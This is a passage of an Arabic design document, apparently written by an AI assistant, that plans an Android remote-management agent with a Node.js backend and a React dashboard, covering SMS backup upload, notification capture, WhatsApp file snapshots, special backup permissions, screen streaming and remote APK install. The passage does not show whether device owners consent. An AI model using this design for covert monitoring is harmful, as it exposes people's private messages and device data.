2. مرحلة 1: فقط نسخ الملفات المشفرة وحفظها كـ snapshot
3. مرحلة 2: البحث في `android.permission.BACKUP` مع `WRITE_SECURE_SETTINGS`

### 9.4 ⚠️ إدارة آلاف الاتصالات المتزامنة

**الحالة الحالية:** عشرات إلى مئات الأجهزة → Node.js وحده كافٍ.  
**للتوسع المستقبلي:**
```
1. Redis Pub/Sub لتوزيع الرسائل بين multiple Node.js instances
2. كل instance يحتفظ بـ connection map محلية
3. عند إرسال command: Redis Pub/Sub يوجّهه للـ instance الصحيح
4. يمكن استخدام Nginx load balancer مع sticky sessions للـ WebSocket
```

### 9.5 ⚠️ File Upload الكبيرة (SMS backups)

**المشكلة:** ملفات backup قد تكون كبيرة (عشرات MB).  
**الحل:**
```
1. Streaming upload بدلاً من حمل الملف كاملاً في الذاكرة
2. Multipart upload لـ S3
3. Presigned URL: السيرفر يولّد URL مؤقت، والجهاز يرفع مباشرة لـ S3
   (يقلل load على الـ Backend)
4. Compression (gzip) قبل الرفع
```

---

## 10. خارطة التنفيذ (Roadmap)

### المرحلة 1 – الأساس (Foundation) ▸ أسبوعان

```
الهدف: نظام يعمل end-to-end

Backend:
  ✅ إعداد المشروع (Node.js + TypeScript + Fastify)
  ✅ قاعدة البيانات (PostgreSQL + Prisma migrations)
  ✅ Redis setup
  ✅ Device Registration endpoint
  ✅ WebSocket Gateway للـ Agents
  ✅ Heartbeat handling
  ✅ Command dispatch (أبسط حالة)

Android Agent:
  ✅ المشروع الأساسي (Kotlin + Android Studio)
  ✅ Foreground Service + Boot Receiver
  ✅ Registration logic
  ✅ WebSocket connection + Reconnection
  ✅ Heartbeat sending
  ✅ استقبال أوامر وإرسال نتائج
  ✅ get_device_info implementation

Dashboard:
  ✅ إعداد المشروع (React + Vite + TypeScript)
  ✅ صفحة Login
  ✅ قائمة الأجهزة (Online/Offline)
  ✅ تفاصيل جهاز
```

### المرحلة 2 – الوظائف الأساسية ▸ أسبوعان

```
Backend:
  ✅ File Storage (محلي + metadata في DB)
  ✅ Offline Command Queue (Redis + DB)
  ✅ Admin Auth (JWT + RBAC)
  ✅ Dashboard WebSocket للـ real-time updates

Android Agent:
  ✅ backup_sms (قراءة + تنظيم + رفع)
  ✅ NotificationListenerService (إرسال batch كل دقيقة)
  ✅ Local storage للأوامر المعلّقة
  ✅ File Upload (Streaming)

Dashboard:
  ✅ Command buttons (Backup SMS, Get Info)
  ✅ Command status tracking (real-time)
  ✅ Notification log viewer
  ✅ Backup files list + تنزيل
```

### المرحلة 3 – التقوية والتوسع ▸ أسابيع لاحقة

```
  📋 WhatsApp backup (snapshot للملفات المتاحة)
  📋 S3 integration
  📋 Admin Dashboard (إدارة المشرفين)
  📋 Device Groups (تنظيم الأجهزة)
  📋 Bulk Commands (أمر لمجموعة أجهزة)
  📋 Alerting (إشعار عند انخفاض البطارية / الانقطاع عن الشبكة)
  📋 Screen streaming (بحاجة لدراسة إضافية - يحتاج MediaProjection permission)
  📋 APK Remote Install/Update
```

---

## ملخص القرارات التقنية

| الجانب | الاختيار | السبب الرئيسي |
|--------|----------|--------------|
| Android Agent | Kotlin Native | وصول كامل لـ Android APIs |
| Backend Framework | Node.js + Fastify + TypeScript | أداء + نضج WebSocket ecosystem |
| WebSocket Library | `ws` (خام) | تحكم كامل، لا overhead |
| Database | PostgreSQL | ACID، مناسب للـ audit logs |
| Cache/State | Redis | سرعة، ephemeral data |
| ORM | Prisma | Type-safe، migrations |
| Dashboard | React + Vite + TypeScript | نضج، ecosystem |
| Protocol | JSON over WebSocket | بساطة، قابلية التوسع |
| Auth (Devices) | JWT per device | بسيط، موثوق |
| Auth (Admins) | JWT + RBAC | معياري |
| File Storage | Local → S3 (قابل للتبديل) | Abstraction layer |

---

> **الخطوة التالية المقترحة:**  
> البدء بـ **المرحلة 1** – إعداد بنية الـ Backend والـ Agent الأساسية.  
> هل تريد البدء بالـ Backend أم الـ Android Agent؟
